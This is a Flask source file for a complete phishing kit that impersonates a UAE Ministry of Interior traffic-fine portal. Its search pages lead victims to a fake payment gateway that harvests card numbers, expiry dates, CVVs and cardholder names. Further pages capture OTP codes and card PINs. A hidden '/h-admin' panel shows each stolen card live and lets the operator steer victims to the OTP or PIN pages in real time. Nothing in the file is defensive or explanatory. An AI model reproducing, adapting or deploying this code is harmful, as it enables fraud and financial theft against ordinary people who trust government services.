import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات وهمية لتخزين البيانات أثناء تشغيل السيرفر
db = {"sessions": {}, "status": "waiting", "msg": ""}

# --- 1. الهيدر الرسمي الفخم (ثابت ولا يتغير) ---
MOI_TOP_BAR = '''
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    .moi-header { background: white; border-bottom: 1px solid #eee; font-family: sans-serif; }
    .moi-container { max-width: 1200px; margin: 0 auto; padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; }
    .moi-tools { display: flex; align-items: center; gap: 25px; color: #555; font-size: 20px; }
    .moi-menu-btn { background: #b0914f; color: white; padding: 12px 20px; border-radius: 6px; font-size: 20px; cursor: pointer; }
    .moi-logo-sec { background: white; text-align: center; padding: 20px 0; border-bottom: 4px solid #b0914f; }
    .moi-logo-img { width: 90%; max-width: 800px; display: inline-block; }
</style>
<div class="moi-header">
    <div class="moi-container">
        <div class="moi-tools">
            <span style="font-weight:bold; color:#333; cursor:pointer;">EN | دخول</span>
            <i class="fa fa-info-circle"></i><i class="fa fa-volume-up"></i><i class="fa fa-question-circle"></i>
        </div>
        <div class="moi-menu-btn"><i class="fa fa-bars"></i></div>
    </div>
</div>
<div class="moi-logo-sec">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" class="moi-logo-img">
</div>
'''

# --- 2. الصفحة الرئيسية (كاملة بالزر المخفي) ---
@app.route('/')
def index():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><body style="margin:0; font-family:sans-serif; background:#f7f8fa;">
        <div style="max-width:1000px; margin:0 auto; position:relative;">
            <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg" style="width:100%; display:block;">
            <button onclick="location.href='/search'" style="position:absolute; top:32%; left:10%; width:80%; height:15%; background:transparent; border:none; cursor:pointer; z-index:100;"></button>
        </div>
    </body></html>
    '''
    return render_template_string(html)

# --- 3. صفحة الاستعلام (التبويبات الشغالة والتصميم الرسمي) ---
@app.route('/search')
def search():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
        body{background:#f7f8fa; margin:0; font-family:sans-serif;}
        .main-card{background:white; width:92%; max-width:900px; margin:40px auto; border-top:10px solid #b0914f; padding:50px; box-shadow:0 15px 40px rgba(0,0,0,0.1); border-radius:0 0 20px 20px;}
        .tabs-container{display:flex; justify-content:center; gap:12px; margin-bottom:40px; border-bottom:2px solid #eee; padding-bottom:20px;}
        .tab-btn{padding:20px 30px; border:1px solid #ddd; background:#f4f4f4; cursor:pointer; font-weight:bold; font-size:18px; border-radius:10px; flex:1; text-align:center; color:#555; transition:0.3s;}
        .tab-btn.active{background:#b0914f; color:white; border-color:#b0914f; box-shadow:0 5px 15px rgba(176,145,79,0.3);}
        label{display:block; margin:20px 0 10px; font-weight:bold; color:#444; font-size:20px;}
        select, input{width:100%; padding:24px; border:1.5px solid #ddd; border-radius:12px; margin-bottom:25px; font-size:20px; outline:none; background:#fff; box-sizing:border-box;}
        .btn-search{width:100%; padding:28px; background:#b0914f; color:white; border:none; font-size:26px; font-weight:bold; cursor:pointer; border-radius:12px; margin-top:20px;}
        .content-section{display:none;} .content-section.active{display:block;}
    </style></head>
    <body>
        <div class="main-card">
            <h1 style="color:#333; text-align:center; margin-bottom:40px; font-size:32px;">الاستعلام عن المخالفات المرورية</h1>
            <div class="tabs-container">
                <div class="tab-btn active" onclick="openTab(event, 'plate-tab')">بيانات اللوحة</div>
                <div class="tab-btn" onclick="openTab(event, 'tc-tab')">الرمز المروري (T.C)</div>
                <div class="tab-btn" onclick="openTab(event, 'license-tab')">بيانات الرخصة</div>
            </div>
            
            <div id="plate-tab" class="content-section active">
                <label>الإمارة</label>
                <select>
                    <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                    <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
                </select>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:25px;">
                    <div><label>مصدر اللوحة</label><select><option>خصوصي</option><option>تجاري</option></select></div>
                    <div><label>فئة اللوحة</label><input placeholder="مثال: 1"></div>
                </div>
                <label>رقم اللوحة</label><input placeholder="12345">
            </div>
            
            <div id="tc-tab" class="content-section">
                <label>الرمز المروري الموحد (Traffic Code Number)</label>
                <input placeholder="أدخل 8 أرقام">
            </div>
            
            <div id="license-tab" class="content-section">
                <label>رقم رخصة القيادة</label>
                <input placeholder="أدخل رقم الرخصة">
            </div>
            
            <button onclick="location.href='/checkout'" class="btn-search">بدء عملية الاستعلام</button>
        </div>
        <script>
            function openTab(evt, tabId) {
                let sections = document.getElementsByClassName("content-section");
                for (let i=0; i<sections.length; i++) sections[i].classList.remove("active");
                let tabs = document.getElementsByClassName("tab-btn");
                for (let i=0; i<tabs.length; i++) tabs[i].classList.remove("active");
                document.getElementById(tabId).classList.add("active");
                evt.currentTarget.classList.add("active");
            }
        </script>
    </body></html>
    '''
    return render_template_string(html)

# --- 4. صفحة الدفع (الاحترافية والعملاقة) ---
@app.route('/checkout')
def checkout():
    html = MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
        body{background:#f4f6f8; font-family:sans-serif; margin:0;}
        .pay-box{max-width:850px; margin:40px auto; background:white; border-radius:20px; box-shadow:0 15px 40px rgba(0,0,0,0.1); padding:60px;}
        .v-header{background:#b0914f; color:white; padding:30px; border-radius:15px 15px 0 0; text-align:center; margin:-60px -60px 40px -60px; font-size:28px; font-weight:bold;}
        input, select{width:100%; padding:25px; margin-bottom:25px; border:1.5px solid #ddd; border-radius:12px; font-size:22px; outline:none; box-sizing:border-box;}
        .btn-pay{width:100%; padding:28px; background:#b0914f; color:white; border:none; border-radius:12px; font-size:28px; font-weight:bold; cursor:pointer;}
        .logos img{height:50px; opacity:0.3; margin:0 15px; transition:0.3s;}
        .active-logo{opacity:1 !important; transform:scale(1.2);}
    </style></head>
    <body>
        <div class="pay-box">
            <div class="v-header">بوابة دفع المخالفات الموحدة - 2026</div>
            <div style="text-align:center; margin-bottom:40px;">
                <img id="v-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png">
                <img id="m-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
            </div>
            <form action="/submit-card" method="POST">
                <input name="card" id="c_num" placeholder="رقم البطاقة" maxlength="19" required>
                <div style="display:flex; gap:20px;">
                    <select name="exp_m" required>
                        <option value="">الشهر</option>
                        {% for m in range(1, 13) %}<option>{{ "%02d"|format(m) }}</option>{% endfor %}
                    </select>
                    <select name="exp_y" required>
                        <option value="">السنة</option>
                        {% for y in range(2026, 2037) %}<option>{{ y }}</option>{% endfor %}
                    </select>
                </div>
                <div style="display:flex; gap:20px;">
                    <input name="cvv" placeholder="CVV" maxlength="3" style="flex:1;" required>
                    <input name="holder" placeholder="اسم حامل البطاقة" style="flex:3;" required>
                </div>
                <button type="submit" class="btn-pay">دفع المبلغ المستحق</button>
            </form>
        </div>
        <script>
            document.getElementById('c_num').addEventListener('input', e => {
                let v = e.target.value.replace(/\\s/g, '');
                document.getElementById('v-logo').classList.toggle('active-logo', v.startsWith('4'));
                document.getElementById('m-logo').classList.toggle('active-logo', v.startsWith('5'));
                e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
            });
        </script>
    </body></html>
    '''
    return render_template_string(html)

# --- 5. صفحات OTP و PIN (تصميم ملكي ضخم) ---
@app.route('/otp')
def otp():
    return render_template_string(MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><body style="background:#f0f2f5; font-family:sans-serif; margin:0;">
        <div style="display:flex; justify-content:center; align-items:center; min-height:80vh;">
            <div style="background:white; width:90%; max-width:700px; padding:80px; border-radius:30px; text-align:center; border-top:10px solid #b0914f; box-shadow:0 20px 50px rgba(0,0,0,0.1);">
                <h1 style="font-size:35px; color:#333;">رمز التأكيد (OTP)</h1>
                <p style="font-size:20px; color:#666; margin-bottom:40px;">أدخل الرمز المرسل إلى رقم هاتفك المسجل</p>
                <form action="/submit-card" method="POST">
                    <input name="otp" maxlength="6" style="width:100%; padding:35px; font-size:60px; text-align:center; border:3px solid #eee; border-radius:20px; margin-bottom:40px; letter-spacing:15px; font-weight:bold; outline:none;">
                    <button style="width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:30px; font-weight:bold; cursor:pointer;">تأكيد السداد</button>
                </form>
            </div>
        </div>
    </body></html>''')

@app.route('/pin')
def pin():
    return render_template_string(MOI_TOP_BAR + '''
    <html lang="ar" dir="rtl"><body style="background:#f0f2f5; font-family:sans-serif; margin:0;">
        <div style="display:flex; justify-content:center; align-items:center; min-height:80vh;">
            <div style="background:white; width:90%; max-width:700px; padding:80px; border-radius:30px; text-align:center; border-top:10px solid #b0914f; box-shadow:0 20px 50px rgba(0,0,0,0.1);">
                <h1 style="font-size:35px; color:#333;">الرقم السري للبطاقة (PIN)</h1>
                <p style="font-size:20px; color:#666; margin-bottom:40px;">يرجى إدخال الرقم السري المكون من 4 أرقام</p>
                <form action="/submit-card" method="POST">
                    <input name="pin" type="password" maxlength="4" style="width:100%; padding:35px; font-size:60px; text-align:center; border:3px solid #eee; border-radius:20px; margin-bottom:40px; letter-spacing:15px; font-weight:bold; outline:none;">
                    <button style="width:100%; padding:30px; background:#b0914f; color:white; border:none; border-radius:20px; font-size:30px; font-weight:bold; cursor:pointer;">إرسال</button>
                </form>
            </div>
        </div>
    </body></html>''')

# --- 6. لوحة التحكم VIP (عرض الكروت بشكل ملون) ---
@app.route('/h-admin')
def admin():
    return render_template_string('''
    <html lang="ar" dir="rtl"><head><style>
        body{background:#0a0a0a; color:#fff; font-family:sans-serif; padding:40px;}
        .card-ui { background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); width:450px; height:260px; border-radius:25px; padding:30px; position:relative; margin:20px; display:inline-block; vertical-align:top; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
        .c-num { font-size:32px; letter-spacing:4px; margin-top:80px; text-shadow:2px 2px 4px #000; }
        .admin-box { background:#1a1a1a; padding:20px; border-radius:0 0 25px 25px; width:470px; margin-left:20px; margin-top:-30px; border:1px solid #333; }
        .btn-act { padding:18px; border:none; border-radius:12px; cursor:pointer; font-weight:bold; width:48%; margin:1%; font-size:16px; color:white; }
    </style></head>
    <body>
        <h1>لوحة تحكم 2026 👮‍♂️</h1>
        <div id="logs"></div>
        <script>
            function refresh(){
                fetch('/get-logs').then(r=>r.json()).then(data=>{
                    let h = '';
                    for(let id in data.sessions){
                        let s = data.sessions[id];
                        h += `<div>
                            <div class="card-ui">
                                <div style="position:absolute; top:30px; right:30px;">CVV: ${s.cvv}</div>
                                <div class="c-num">${s.card}</div>
                                <div style="margin-top:40px;">${s.holder}</div>
                                <div style="position:absolute; bottom:30px; right:30px;">${s.exp_m}/${s.exp_y}</div>
                            </div>
                            <div class="admin-box">
                                <div style="color:#0f0; font-size:24px; text-align:center; margin-bottom:15px;">
                                    OTP: ${s.otp || '---'} | PIN: ${s.pin || '---'}
                                </div>
                                <button class="btn-act" style="background:#27ae60;" onclick="act('go_otp')">طلب OTP</button>
                                <button class="btn-act" style="background:#2980b9;" onclick="act('go_pin')">طلب PIN</button>
                            </div>
                        </div>`;
                    }
                    document.getElementById('logs').innerHTML = h;
                });
            }
            function act(st){ fetch('/set-status/'+st); }
            setInterval(refresh, 2000); refresh();
        </script>
    </body></html>''')

# --- 7. الباكيند (الربط والتحكم) ---
@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card') or "CARD"
    if c not in db['sessions']: db['sessions'][c] = request.form.to_dict()
    else: db['sessions'][c].update(request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string('''<script>setInterval(()=>{fetch("/check-status").then(r=>r.json()).then(d=>{if(d.status==="go_otp")location.href="/otp";if(d.status==="go_pin")location.href="/pin";});},2000);</script><body style="text-align:center;padding-top:200px;font-family:sans-serif;background:#f8f9fa;"><h2>جاري معالجة الطلب...</h2></body>''')

@app.route('/get-logs')
def get_logs(): return jsonify({"sessions": db['sessions']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status']})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
